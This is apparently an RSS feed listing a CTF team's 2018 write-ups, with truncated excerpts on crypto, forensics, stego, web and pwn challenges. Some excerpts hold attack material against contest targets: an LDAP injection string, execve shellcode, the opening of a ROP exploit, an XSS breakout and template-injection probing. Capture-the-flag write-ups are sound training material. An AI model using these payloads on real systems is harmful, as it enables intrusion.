<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Writeups on LiUhack - CTF team at LiU</title>
    <link>https://liuhack.github.io/writeups/</link>
    <description>Recent content in Writeups on LiUhack - CTF team at LiU</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    
	<atom:link href="https://liuhack.github.io/writeups/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/csaw/flatcrypt/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/csaw/flatcrypt/readme/</guid>
      <description>flatcrypt There is a server provided that combines a input message f with the flag PROBLEM_KEY, then compresses and encrypts it. The relevant code looks like this:
if (len(f)&amp;gt;=20): data = bytes((PROBLEM_KEY + f).encode(&#39;utf-8&#39;)) ctr = Counter.new(64, prefix=os.urandom(8)) enc = AES.new(ENCRYPT_KEY, AES.MODE_CTR, counter=ctr).encrypt(zlib.compress(data)) print(&amp;quot;%s%s&amp;quot; %(enc, chr(len(enc))))  With the allowed characterset of f being lowercase letters and underscore.
What stands out here is that the length of the encrypted message is explicitly returned, and that the data is compressed.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/csaw/ldab/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/csaw/ldab/readme/</guid>
      <description>Ldab - Web On this website, we can search for users and groups and because of the hint in challenge title, we first try LDAP Injection. After checking OWASP page, we first try this injection
 http://web.chal.csaw.io:8080/index.php?search=*)(uid=*))(|(uid=*
 This one worked and gave us the flag: flag{ld4p_inj3ction_i5_a_th1ng}</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/csaw/rewind/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/csaw/rewind/readme/</guid>
      <description>Rewind- Forensics We are given a zip file which contains two files: rewind-rr-snp and rewind-rr-nodent.log. If we do file command on the first one, we get
 QEMU suspend to disk image
 Then first thing I try is to grep for flag
 strings rewind-rr-snp | grep flag{
 Then we found the flag{RUN_R3C0RD_ANA1YZ3_R3P3AT} in the result.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/csaw/sso/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/csaw/sso/readme/</guid>
      <description>SSO - Web  Donâ€™t you love undocumented APIs Be the admin you were always meant to be
 In this challenge, we have a webpage that got this information in the source code
&amp;lt;h1&amp;gt;Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!&amp;lt;/h1&amp;gt; &amp;lt;a href=&amp;quot;/protected&amp;quot;&amp;gt;.&amp;lt;/a&amp;gt; &amp;lt;!-- Wish we had an automatic GET route for /authorize... well they&#39;ll just have to POST from their own clients I guess POST /oauth2/token POST /oauth2/authorize form-data TODO: make a form for this route --!</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/csaw/short_circuit/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/csaw/short_circuit/readme/</guid>
      <description>Short_circuit In this challenge, you were given the following image:
Looking closer at it, you can see that it is a funny-looking circuit diagram with some power sources, grounds, and LEDs. If you rotate the image and follow the wire from the green dot, and mark the branching arrows with &amp;ldquo;1&amp;rdquo; if it causes an LED to turn on, and &amp;ldquo;0&amp;rdquo; if it does not, you end up with the following image.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/csaw/simple_recovery/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/csaw/simple_recovery/readme/</guid>
      <description>Simple recovery - Forensics We are given two RAID5 disk images and the first we tried was to recover these using OSForensics and then mount it but that gave us that it was corrupted. Then we just tried a simple grep for flag on one of the images:
 strings disk.img0 | grep flag
 This gave us the flag directly: flag{dis_week_evry_week_dnt_be_securty_weak}</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/csaw/whyos/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/csaw/whyos/readme/</guid>
      <description>WhyOS In this challenge you were given an Apple program and a system log, with the implication that the flag is somewhere in the log. Since the system log was 23 MB large, it was not feasible to read everything manually. Quick searches for strings like &amp;ldquo;flag&amp;rdquo; revealed nothing. After reversing the program slightly, we found the following interesting bit:
/* @class CSAWRootListController */ -(void)setflag { stack[-4] = r7; stack[-8] = lr; r7 = sp - 0x8; sp = sp - 0x38; var_4 = self; var_8 = _cmd; var_10 = [[NSMutableDictionary alloc] initWithContentsOfFile:@&amp;quot;/var/mobile/Library/Preferences/com.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/icectf/anticaptcha/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/icectf/anticaptcha/readme/</guid>
      <description>#AntiCaptcha
For this challenge you were given a rather long form with questions to be filled in. Most of the questions were of of the following types:
 What is the greatest common divisor of 2052 and 5816? What is the 2nd word in the following line: for job bring next mention prove. maybe let thank show. live recent i seek. arrive stay draw save thought exist. manage number drug eye tough kind.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/icectf/drumbone/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/icectf/drumbone/readme/</guid>
      <description>#Drumbone - Stego
We get an image and if we run stegoveritas tool on it, we get: This looks like QR-code and if we draw it, we get a QR-code that works to scan:
Then we get the flag:
IceCTF{Elliot_has_been_mapping_bits_all_day}</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/icectf/garfeld/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/icectf/garfeld/readme/</guid>
      <description>#Garfeld - Crypto
 You found the marketing campaign for a brand new sitcom. Garfeld! It has a secret message engraved on it. Do you think you can figure out what they&amp;rsquo;re trying to say?
 We get this image
To decrypt this, we first tried https://quipqiup.com/ but it did not give the correct flag. Then we created this script:
key = [0, 7, 2, 7, 1, 9, 7, 8] cipher = &#39;IjgJUOPLOUVAIRUSGYQUTOLTDSKRFBTWNKCFT&#39; output = &#39;&#39;.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/icectf/hardshells/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/icectf/hardshells/readme/</guid>
      <description>#Hard shells - Forensics
 After a recent hack, a laptop was seized and subsequently analyzed. The victim of the hack? An innocent mexican restaurant. During the investigation they found this suspicous file. Can you find any evidence that the owner of this laptop is the culprit?
 We first get a password protected zip file, so we use fcrackzip to crack the password and the password is tacos. Then we get a filesystem</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/icectf/rabbithole/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/icectf/rabbithole/readme/</guid>
      <description>#Rabbit hole - Stego
We get an image with an onion on it and first thing we try to do is running steghide command: &amp;gt; steghide extract -sf rabbithole.jpg
This requires a password and the first thing I tried was onion which worked. The reason I tried this password was because there was an onion on the picture. Then I get a file called address.txt which contains: &amp;gt; wsqxiyhn23zdi6ia
After trying a lot of tools and comparing picture with original picture without finding anything, I try to google &amp;ldquo;onion address&amp;rdquo; and then I find that this could be an onion address in Tor-browser.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/icectf/toke-relaunch/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/icectf/toke-relaunch/readme/</guid>
      <description>#Toke Relaunch - Web &amp;gt; We&amp;rsquo;ve relaunched our famous website, Toke! Hopefully no one will hack it again and take it down like the last time.
On this challenge, we get a website and the first thing to check is robots.txt which contains: &amp;gt;User-agent: * &amp;gt;Disallow: /secret_xhrznylhiubjcdfpzfvejlnth.html
Then we go to that url and we get the flag:
IceCTF{what_are_these_robots_doing_here}</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/sec-t/pingpong/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/sec-t/pingpong/readme/</guid>
      <description>PingPong - pwn  To start out nice and easy, how about a game of ping pong?
 #!/usr/bin/python import pwn import struct import array import os LIBC_SYSTEM_OFFSET = -0x398E60 LIBC_BIN_SH_OFFSET = -0x234406 POP_RDI_OFFSET = 0x493 RET_ADDRESS_OFFSET = -0x1F0 def fix_case(crap): ret = &amp;quot;&amp;quot; for i in range(0, len(crap)): if i &amp;amp; 0x1 == 0x0: ret += crap[i] else: ret += chr(ord(crap[i]) ^ 0x20) return ret def leak(stackRel): p.recvuntil(&#39;ping: &#39;) p.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/sec-t/shredder/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/sec-t/shredder/readme/</guid>
      <description>Shredder - Misc In this challenge, we get floppy.img which is a FAT12 image. We can extract an ELF executable shredder from this image. Then I use testdisk tool to try to recover deleted files and I find flag.txt but it is gibberish or encrypted stuff. If you run the shredder file, you get
 ./shredder passes files
 Next step is to reverse the shredder binary to see what it does, and it XORs every byte with the contents of flag.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/midnightsun-quals/babyshells/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/midnightsun-quals/babyshells/readme/</guid>
      <description>Babyshells - Pwn  If you hold a babyshell close to your ear, you can hear a stack getting smashed
 In this task we were given three binaries, in x86, ARM and MIPS respectively. All of them jumped into our buffer so we can send the shellcode directly on all three binaries. Then each binary gives one third of the flag.
x86:
p=remote(&amp;quot;52.30.206.11&amp;quot;,7000) p.recvuntil(&amp;quot;&amp;gt; &amp;quot;) p.sendline(&amp;quot;1&amp;quot;) p.recvuntil(&amp;quot;gimme: &amp;quot;) exploit = &amp;quot;&amp;quot; exploit += &amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80&amp;quot; p.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/midnightsun-quals/diary/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/midnightsun-quals/diary/readme/</guid>
      <description>Diary - Misc  We found a torn diary on the ground. It seems to belong to a local boy.
 In this challenge, we got a git repository. The first thing we can do is trying git log and we got the following
commit 2fec4e955704bd60292a9f9169f05c3334e555f4 (HEAD -&amp;gt; master) Author: Calle Svensson &amp;lt;calle.svensson@zeta-two.com&amp;gt; Date: Sat Apr 14 02:22:52 2018 +0200 Added pencil to wishlist commit b182065ebc321a5432ab89be1ef2240077b3fbec Author: Calle Svensson &amp;lt;calle.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/midnightsun-quals/hm4c/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/midnightsun-quals/hm4c/readme/</guid>
      <description>Hm4c - crypto  Some n00b implemented a HMAC, I&amp;rsquo;m sure you can pwn it.
 NOTE: mirror of the blog post at https://toblu302.github.io/writeup/2018/04/15/midnight-sun-ctf-hm4c-writeup.html
The following post is a writeup for the Midnight Sun CTF online qualifiers. The challenge was to find an encryption key which was used to encrypt some data on a server. You were given some source code of a program, as well as an IP to a server which is running the program.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/midnightsun-quals/jeil/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/midnightsun-quals/jeil/readme/</guid>
      <description>Jeil - Web  You are awesome at breaking into stuff, how about breaking out?
 In this challenge, we need to break out of a Javascript jail. This is the source code of it:
var readline = require(&#39;readline&#39;); var rl = readline.createInterface(process.stdin, process.stdout); var Jail = (function() { var rv = {}; function secretFuncUnguessable{{ENV_SECRET_0}}(a,b,c){ if(a === &#39;{{ENV_SECRET_1}}&#39; &amp;amp;&amp;amp; b === &#39;{{ENV_SECRET_2}}&#39; &amp;amp;&amp;amp; c === &#39;{{ENV_SECRET_3}}&#39;){ return true; } } function call(code) { var line = &amp;quot;&amp;quot;; if(new RegExp(/[\[\]\.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/picoctf/a_simple_question/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/picoctf/a_simple_question/readme/</guid>
      <description>A simple question - Web In this challenge, we are presented with a page that asks us to answer a question. The first thing we do is check the source code and we find
If we go to that file, it contains this code: ```php &amp;lt;?php include &amp;quot;config.php&amp;quot;; ini_set(&#39;error_reporting&#39;, E_ALL); ini_set(&#39;display_errors&#39;, &#39;On&#39;); $answer = $_POST[&amp;quot;answer&amp;quot;]; $debug = $_POST[&amp;quot;debug&amp;quot;]; $query = &amp;quot;SELECT * FROM answers WHERE answer=&#39;$answer&#39;&amp;quot;; echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;; echo &amp;quot;SQL query: &amp;quot;, htmlspecialchars($query), &amp;quot;\n&amp;quot;; echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;; ?</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/picoctf/authenticate/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/picoctf/authenticate/readme/</guid>
      <description>Authenticate - Pwn On this challenge, we get this source code:
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;stdint.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; int authenticated = 0; int flag() { char flag[48]; FILE *file; file = fopen(&amp;quot;flag.txt&amp;quot;, &amp;quot;r&amp;quot;); if (file == NULL) { printf(&amp;quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n&amp;quot;); exit(0); } fgets(flag, sizeof(flag), file); printf(&amp;quot;%s&amp;quot;, flag); return 0; } void read_flag() { if (!</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/picoctf/fancy-alive-monitoring/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/picoctf/fancy-alive-monitoring/readme/</guid>
      <description>Fancy-alive-monitoring - Web We are presented with a page where we can input an input IP address of a target host. We also get the following source code:
&amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Monitoring Tool&amp;lt;/title&amp;gt; &amp;lt;script&amp;gt; function check(){ ip = document.getElementById(&amp;quot;ip&amp;quot;).value; chk = ip.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/); if (!chk) { alert(&amp;quot;Wrong IP format.&amp;quot;); return false; } else { document.getElementById(&amp;quot;monitor&amp;quot;).submit(); } } &amp;lt;/script&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h1&amp;gt;Monitoring Tool ver 0.1&amp;lt;/h1&amp;gt; &amp;lt;form id=&amp;quot;monitor&amp;quot; action=&amp;quot;index.php&amp;quot; method=&amp;quot;post&amp;quot; onsubmit=&amp;quot;return false;&amp;quot;&amp;gt; &amp;lt;p&amp;gt; Input IP address of the target host &amp;lt;input id=&amp;quot;ip&amp;quot; name=&amp;quot;ip&amp;quot; type=&amp;quot;text&amp;quot;&amp;gt; &amp;lt;/p&amp;gt; &amp;lt;input type=&amp;quot;button&amp;quot; value=&amp;quot;Go!</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/picoctf/flaskcards/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/picoctf/flaskcards/readme/</guid>
      <description>Flaskcards - Web We are given a webpage where we first register an account and then we have the ability to create cards and view those created cards. After trying some different input, and thinking about the challenge title we figured out this is a SSTI problem and that Flask is used as backend.
This can be confirmed by entering
 {{ 7*7}}
 This gives us 49 so it is executed on the backend.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/picoctf/flaskcards_skeleton_key/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/picoctf/flaskcards_skeleton_key/readme/</guid>
      <description>Flaskcards Skeleton Key - Web  Nice! You found out they were sending the Secret_key: 385c16dd09098b011d0086f9e218a0a2. Now, can you find a way to log in as admin?
 This page is the same as the last challenge Flaskcards but now we have to login as admin. If I intercept the request to /admin, we see our user has a session cookie that contains the value:
.eJwlj0tqAzEQBe-itRdSt1rd8mWG_okYQwIz9irk7hak9q949VuOdeb1Ve6v8523cjyi3MvC4CmAA5QqklCOmsRDUYmGs6U1BpsNR53VyGu34FzmQgTGS4cYdeQaEI15NjAdEISunXoPJRZSTRyRhjKEoQk7L5e6Kbfi17mO188zv_efbOC-mFwmhKQDixNDInDTreW25jbh3r2vPP8jqPx9AAZePd0.DpA5UQ.ALSxhNUvHq8TDSk0gxcmee3A56E
With the secret_key that we got in the problem description, I directly thought of this as a Flask cookie because the name of the title and that we have to modify it to get logged in as admin.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/picoctf/flaskcards_and_freedom/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/picoctf/flaskcards_and_freedom/readme/</guid>
      <description>Flaskcards and Freedom - Web From the hints on this challenge, we need to get RCE and we can get that by template injection.
First we run
g.__class__  This returns a class object: &amp;gt; Then we do:
g.__class__.__mro__  This returns a list of classes that g.__class__ is inheriting from(mro stands for Method Resolution Order) &amp;gt; (, )
Then we need the second index there which will be [1].</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/picoctf/help_me_reset2/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/picoctf/help_me_reset2/readme/</guid>
      <description>Help Me Reset 2 - Web In this challenge, we need to reset a password for a user. By going to the reset link, we need a username. We first try admin and some other names but they don&amp;rsquo;t exist. If we go back to the homepage of the challenge and look in the source code, we find this HTML comment:
&amp;lt;!--Proudly maintained by dial--&amp;gt;  Now we have a username and if I enter it, I get the security question &amp;gt; What is you favorite hero?</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/picoctf/secure_logon/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/picoctf/secure_logon/readme/</guid>
      <description>Secure Logon - Web We are presented with a webpage and source code to it. The source code we get is the following:
from flask import Flask, render_template, request, url_for, redirect, make_response, flash import json from hashlib import md5 from base64 import b64decode from base64 import b64encode from Crypto import Random from Crypto.Cipher import AES app = Flask(__name__) app.secret_key = &#39;seed removed&#39; flag_value = &#39;flag removed&#39; BLOCK_SIZE = 16 # Bytes pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \ chr(BLOCK_SIZE - len(s) % BLOCK_SIZE) unpad = lambda s: s[:-ord(s[len(s) - 1:])] @app.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/picoctf/super_safe_rsa/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/picoctf/super_safe_rsa/readme/</guid>
      <description>Super Safe RSA - Crypto On this RSA challenge, we get the following:
c: 2425856200769915981651037422985132378377167608258701728568281807599094681752373 n: 27648161471552692194976798121921575562926832795742781625850575808536319404313029 e: 65537  First thing I try is to factorize the n on Alpertron. Then we get p and q:
p = 169164339873385123585987559611932758873 q = 163439655735047847596122332439710591236173  Then we create this script to decrypt the ciphertext c:
#!/usr/bin/env python import libnum n = 27648161471552692194976798121921575562926832795742781625850575808536319404313029 c = 2425856200769915981651037422985132378377167608258701728568281807599094681752373 e = 65537 p = 169164339873385123585987559611932758873 q = 163439655735047847596122332439710591236173 n=p*q phi=(p-1)*(q-1) d = libnum.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/picoctf/super_safe_rsa2/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/picoctf/super_safe_rsa2/readme/</guid>
      <description>Super Safe RSA 2 - Crypto  Wow, he made the exponent really large so the encryption MUST be safe, right?! Connect with nc 2018shell2.picoctf.com 56543
 If we connect to it, we get the following numbers:
c: 74656558022839055957486462819905995876187919411516725694171429102789712929327942602783390443413015793339709672458190916198217092854563013073826016059117106865706437459318250499145704904019507722273390686196228735285877381812173288926254273484207110105872784138331460508370948963482034330305034653674346440792 n: 148337238837980204604258481398486555479662772411127669544511411414637480091964615739652008000282038439580320179857917659146369849900257414100209029025277317009008322530433114360958279216638713900178224553226111248718730750329686617313196229443362042513004804865365680353556694701248340698570731626730407309679 e: 44107111604677056428020584204530379886662319696898620571797517039794933771031851731366993910333034515954372329293242617510494976349334211644884162360431185438204499339781140455266740769128912694626003486588778554609303393869982440909134987801843941738926751485241331998121883562658508426442151685340795506049  Since e is not a usual value here, and it is very large, I google about that and find that RSA with such large e is easily prone to Wiener Attack.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/picoctf/super_safe_rsa3/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/picoctf/super_safe_rsa3/readme/</guid>
      <description>Super Safe RSA 3 - Crypto On this RSA challenge, we get the following:
c: 2214959746368961374343866619773680463913808855252144119575578619282028038148568609891198127966225495311682540323131579203618894145626046974546075970616339033486317429461235324910794466410074881752239541146624247745072518241741204968025293372054661473208051944193745386532992238774551013797836031291096741 n: 5564465787507426784189854287795264081761345977763964262369153883931335062166838686916377911069328789715623668583315372050520387414170383621534793892389463905512682152442890656361180400315699526374103389751180954335677791471685242043876553878553597343813515063304714971565013966010693181624796612216036537 e: 65537  Here we have a larger n so multiple primes RSA is the way here. We can get all factors on Alpertron
Then we google multiple primes RSA and create this script
c = 2214959746368961374343866619773680463913808855252144119575578619282028038148568609891198127966225495311682540323131579203618894145626046974546075970616339033486317429461235324910794466410074881752239541146624247745072518241741204968025293372054661473208051944193745386532992238774551013797836031291096741 n = 5564465787507426784189854287795264081761345977763964262369153883931335062166838686916377911069328789715623668583315372050520387414170383621534793892389463905512682152442890656361180400315699526374103389751180954335677791471685242043876553878553597343813515063304714971565013966010693181624796612216036537 e = 65537 p1 = 2175350609 p2 = 2182560491 p3 = 2196605027 p4 = 2209029391 p5 = 2466547367 p6 = 2510616961 p7 = 2588079563 p8 = 2704140821 p9 = 2736762829 p10 = 2796597043 p11 = 2809479437 p12 = 2829659713 p13 = 2837556643 p14 = 2858051057 p15 = 3032087491 p16 = 3042267581 p17 = 3063304267 p18 = 3102491383 p19 = 3219243151 p20 = 3284737447 p21 = 3392021827 p22 = 3789952469 p23 = 3812358577 p24 = 3858988619 p25 = 3864352469 p26 = 3877179469 p27 = 3910354507 p28 = 3985847791 p29 = 3990903569 p30 = 4041031661 p31 = 4069378073 p32 = 4203209281 primes = [p1, p2, p3, p4, p5, p6, p7, p8, p9, p10, p11, p12, p13, \ p14, p15, p16, p17, p18, p19, p20, p21, p22, p23, p24, p25, \ p26, p27, p28, p29, p30, p31, p32] def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) def modinv(a, m): g, x, y = egcd(a, m) if g !</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/picoctf/in_out_error/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/picoctf/in_out_error/readme/</guid>
      <description>in out error - General skills  Can you utlize stdin, stdout, and stderr to get the flag from this program?
 First thing I try is to run this: &amp;gt; echo &amp;ldquo;Please may I have the flag?&amp;rdquo; | ./in-out-error 2&amp;gt;/dev/null
But this gives us the song lyrics as output, so the flag is not in stdout. Then I change so it does not print stdout by running: &amp;gt; echo &amp;ldquo;Please may I have the flag?</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/securityfest/everywhere/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/securityfest/everywhere/readme/</guid>
      <description>Everywhere - Stego  Too much information to decode.
 We are provided with a JPEG image and the first thing we try is to run strings on it, binwalk to see if there is any hidden content in the file but nothing was there. The steghide tool did not find anything either. Then we can try to open the JPEG in GIMP and play around with contrast and brightness.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/securityfest/excesss/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/securityfest/excesss/readme/</guid>
      <description>Excesss - Web  This is some kind of reverse captcha to tell if the visitor is indeed a robot. Can you complete it?
 We are presented with this view in the challenge: If we go to the ?xss=hello link, we can see this in the source code: &amp;lt;script&amp;gt;var x =&#39;hello&#39;; var y = `hello`; var z = &amp;quot;hello&amp;quot;;&amp;lt;/script&amp;gt;
To escapse our own code into that, we can try: &#39;; alert(1); var a=&#39;</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/2018/securityfest/mr.reagan/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/2018/securityfest/mr.reagan/readme/</guid>
      <description>Mr.reagan - Misc  Agent Smith got this from Mr. Reagan, a EMP was activated nearby, or?
 Firstly, the file we got looked like this:
mrreagan: DOS/MBR boot sector, code offset 0x52+2, OEM-ID &amp;quot;NTFS &amp;quot;, sectors/cluster 8, Media descriptor 0xf8, sectors/track 63, heads 255, hidden sectors 128, dos &amp;lt; 4.0 BootSector (0x80), FAT (1Y bit by descriptor); NTFS, sectors/track 63, sectors 96255, $MFT start cluster 4010, $MFTMirror start cluster 2, bytes/RecordSegment 2^(-1*246), clusters/index block 1, serial number 0a2061d9b061d7211  Here we see that we got a NTFS filesystem, and we can try to recover deleted files and see if something is there.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://liuhack.github.io/writeups/readme/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://liuhack.github.io/writeups/readme/</guid>
      <description> writeups Solutions from multiple CTFs we have played
Practice  https://www.hackthebox.eu/ https://www.vulnhub.com/ https://www.root-me.org/ http://pwnable.kr/ https://ctftime.org/  </description>
    </item>
    
  </channel>
</rss>